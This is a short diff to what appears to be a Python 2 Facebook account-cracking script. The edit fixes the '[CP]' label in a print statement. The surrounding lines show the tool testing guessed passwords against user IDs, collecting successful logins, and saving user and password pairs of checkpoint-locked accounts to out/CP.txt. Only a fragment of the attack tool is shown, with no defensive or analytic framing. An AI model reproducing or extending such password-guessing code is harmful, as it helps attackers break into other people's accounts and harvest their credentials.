@@ -385,7 +385,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print 'CP] ' + user  + ' | ' + pass6 + ' | ' + b['name']
+															print '[CP] ' + user  + ' | ' + pass6 + ' | ' + b['name']
 															cek = open("out/CP.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
